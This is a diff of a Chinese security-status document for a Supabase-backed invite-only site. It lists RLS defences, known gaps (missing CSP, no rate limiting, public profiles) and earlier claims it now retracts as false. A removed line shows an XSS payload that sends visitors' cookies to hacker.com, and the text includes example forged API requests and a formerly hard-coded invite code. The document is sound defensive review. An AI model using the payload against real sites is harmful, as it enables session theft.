@@ -1,49 +1,130 @@
-# 安全审计与攻击模拟报告
+# 安全现状与攻击面评估
+
+> 最后核对：2026-11-12。本文档区分**已实现**与**未实现**，不把计划当现状。
 
 ## 测试环境
+
 - 数据库：Supabase (PostgreSQL 15 + PostgREST)
-- 认证：Supabase Auth (JWT 携带 `sub` 即 `auth.uid()`)
-- 暴露面：前端可直连数据库（携带 anon key）
+- 认证：Supabase Auth（JWT `sub` = `auth.uid()`）
+- 暴露面：前端持 anon key 直连数据库，RLS 是唯一防线
 
 ---
 
-## 攻击模拟 1：水平越权（修改别人的主页）
-- **攻击手段**：攻击者注册了账号 A，通过抓包或开发者工具，向 `pages` 表发起 `UPDATE` 请求，试图将 `user_id` 为 B 的 `published_data` 改为恶意内容。
-- **Payload**：
-  ```json
-  { "published_data": { "hacked": true } }
-  ```
-  请求 URL：`PATCH /rest/v1/pages?user_id=eq.<User_B_UUID>`
-- **防御结果**：**拦截成功 (403/影响行数0)**。
-  - 原因：`create policy "Users can update own page." on pages for update using (auth.uid() = user_id);`
-  - RLS 引擎发现请求者的 JWT 中的 `auth.uid()` (A) 不等于条件里的 `user_id` (B)，拒绝更新。
+## 已实现
 
-## 攻击模拟 2：隐私泄露（读取草稿数据）
-- **攻击手段**：攻击者试图通过 API 爬取全站数据，抓取用户尚未发布的 `draft_data`（可能包含隐私、未完成的画作、联系方式）。
-- **Payload**：`GET /rest/v1/pages?select=draft_data`
-- **防御结果**：**拦截成功 (只返回公开数据)**。
-  - 原因：当攻击者未登录时，RLS 的策略 `is_public = true` 只返回已发布的画布。未发布的草稿行对匿名请求不可见。
-  - 如果攻击者登录了账号 A，试图遍历 `GET /rest/v1/pages`，他只能看到所有 `is_public = true` 的，加上他自己那条 `auth.uid() = user_id` 的草稿。完全无法看到 B 的草稿。
+### 1. 水平越权 — 修改他人主页
 
-## 攻击模拟 3：伪造身份（注入评论）
-- **攻击手段**：攻击者登录自己的账号，但在发送评论的请求中，伪造 `user_id` 为受害者 B 的 UUID，企图借刀杀人（冒充别人发垃圾评论）。
-- **Payload**：`POST /rest/v1/comments` Body: `{"user_id": "<User_B>", "content": "垃圾广告"}`
-- **防御结果**：**拦截成功 (403 Forbidden)**。
-  - 原因：`create policy "Authenticated users can insert comments." on comments for insert with check (auth.uid() = user_id);`
-  - 插入时，数据库校验 JWT 里的真实 `uid` 必须等于你要插入的 `user_id`。
+**攻击**：登录账号 A，向 `pages` 发 `PATCH /rest/v1/pages?user_id=eq.<B的UUID>`。
 
-## 攻击模拟 4：XSS 注入攻击（脚本执行）
-- **攻击手段**：攻击者在文章正文或留言板输入 `<script>fetch('http://hacker.com/steal?cookie='+document.cookie)</script>`，试图窃取访问者的登录 Token。
-- **防御结果**：**双层防御拦截**。
-  - 第一层（前端渲染）：所有写入和渲染的内容经过 `DOMPurify` 过滤，`<script>` 标签直接被剥离，变成纯文本。
-  - 第二层（CSP 内容安全策略）：服务端配置 `Content-Security-Policy: default-src 'self'; script-src 'self' 'unsafe-inline' (如果Astro内联);`，即便有恶意脚本被注入，浏览器也会拒绝执行来源不明的脚本。
+**结果**：拦截（0 行受影响）。
 
-## 攻击模拟 5：信息收集（扫描系统保留字）
-- **攻击手段**：攻击者在注册时不断尝试注册 `admin`, `api`, `arcade`, `root`, `support`，企图接管路由或进行社工欺骗。
-- **防御结果**：**拦截成功**。
-  - 原因：应用层正则校验 `^[a-z0-9_]{3,20}$` + 系统保留字黑名单强制拦截。
+**依据**：`rls_policies.sql:18-19`
+```sql
+create policy "Users can update own page."
+  on pages for update using (auth.uid() = user_id);
+```
 
-## 攻击模拟 6：资源耗尽（性能打击）
-- **攻击手段**：攻击者利用脚本每秒狂发 100 条评论，企图撑爆 500MB 数据库。
-- **防御结果**：**部分拦截 / 降级防御**。
-  - 原因：Supabase RLS 没法直接做 Rate Limit。必须依赖我们在 Edge Function 写的限流器（每分钟最多 3 条），以及 Cloudflare 层面的防 CC 攻击拦截。
+### 2. 隐私泄露 — 读取他人草稿
+
+**攻击**：`GET /rest/v1/pages?select=draft_data` 遍历。
+
+**结果**：只能拿到 `is_public = true` 的行 + 自己那条草稿。
+
+**依据**：`rls_policies.sql:12-15`。两条 select 策略以 OR 合并。
+
+### 3. 伪造身份 — 冒名发评论
+
+**攻击**：`POST /rest/v1/comments`，body 里把 `user_id` 填成受害者的 UUID。
+
+**结果**：403。
+
+**依据**：`rls_policies.sql:34-35`，`with check (auth.uid() = user_id)`。
+
+### 4. 邀请码泄露
+
+**历史问题**：`INVITE_CODE = 'ZIJI2026'` 曾硬编码在 `src/lib/api.ts`，被 Astro 打进 `dist/_astro/api.*.js`，DevTools 可见。
+
+**已修复**：迁移到数据库端（`docs/invite_codes.sql`）：
+
+- 码存 `invite_codes` 表，RLS 禁止 anon 读取
+- `verify_invite_code(text)` — 只读校验
+- `consume_invite_code(text, uuid)` — 原子消费，`where used_at is null and expires_at > now()`
+- `create_invite_code(text)` — 仅 `authenticated` 可调
+
+注册流程 `verify` → `signUp` → `consume`，**注册失败不烧码**。
+
+**残留风险**：`consume_invite_code` 对 anon 开放，可被枚举。8 位十六进制 = 43 亿组合，配合「用完即失效」，实际风险可接受。若需加固，加 IP 限流。
+
+### 5. XSS — 渲染层
+
+**现状**：用户输入在渲染前过 DOMPurify（`src/lib/sanitize.ts`），Markdown 走标签白名单。
+
+**依据**：`src/lib/sanitize.ts` 导出 `sanitizeText` / `sanitizeHtml`，`api.ts` 与各页面渲染前调用。
+
+### 6. 保留字与用户名格式
+
+**依据**：`schema.sql:7` `check (username ~ '^[a-z0-9_]{3,20}$')` + 应用层保留字黑名单。
+
+---
+
+## 未实现（真实缺口）
+
+### A. CSP 未配置
+
+**现状**：无 `public/_headers` 文件，Cloudflare Pages 未下发任何安全响应头。
+
+**影响**：若 DOMPurify 被绕过，注入的 `<script>` 会被浏览器执行，无第二道防线。
+
+**修复**：新增 `public/_headers`：
+
+```
+/*
+  X-Content-Type-Options: nosniff
+  X-Frame-Options: DENY
+  Referrer-Policy: strict-origin-when-cross-origin
+  Permissions-Policy: geolocation=(), microphone=(), camera=()
+  Content-Security-Policy: default-src 'self'; script-src 'self' 'unsafe-inline'; style-src 'self' 'unsafe-inline' https://fonts.googleapis.com; font-src https://fonts.gstatic.com; img-src 'self' data: https:; connect-src 'self' https://wgtquypjypkaegrcsmsa.supabase.co wss://wgtquypjypkaegrcsmsa.supabase.co
+```
+
+> `'unsafe-inline'` 因 Astro 内联脚本与样式暂无法去掉。要移除需引入 nonce 或 hash，属后续优化。
+
+### B. 无限流
+
+**现状**：评论、动态、邀请码生成均无频率限制。
+
+**影响**：单个已登录账号可脚本刷数据，撑大存储或刷屏。
+
+**修复选项**：
+1. Supabase Edge Function + 计数表（免费额度 50 万次/月）
+2. Cloudflare Rate Limiting（免费版有限规则数）
+3. 数据库层：`comments` 加触发器，检查最近 1 分钟该 `user_id` 的插入数
+
+### C. `profiles` 全员可读
+
+**现状**：`rls_policies.sql:6-7` `for select using (true)` —— 任何人（含匿名）可列出全部用户资料。
+
+**影响**：你的小站是邀请制，但用户列表对未登录者完全公开，可被爬取。
+
+**若需收紧**：改为 `to authenticated using (true)`，匿名不可读。
+
+---
+
+## 优先级建议
+
+| 项 | 风险 | 成本 | 建议 |
+|---|---|---|---|
+| A. CSP | 中 | 低（一个文件） | **尽快做** |
+| B. 限流 | 中 | 中 | 有滥用迹象时做 |
+| C. profiles 收紧 | 低 | 低 | 顺手改 |
+
+---
+
+## 已失效的历史声明
+
+旧版本文档（2026-11-10）曾声称：
+
+- ❌ 「服务端配置 Content-Security-Policy」——从未配置
+- ❌ 「Edge Function 限流器，每分钟最多 3 条」——从未实现
+- ❌ 「生产环境改为 Supabase 邀请邮件」——实际用 `invite_codes` 表
+
+以上三处均为计划而非现状，已在本文档中更正。
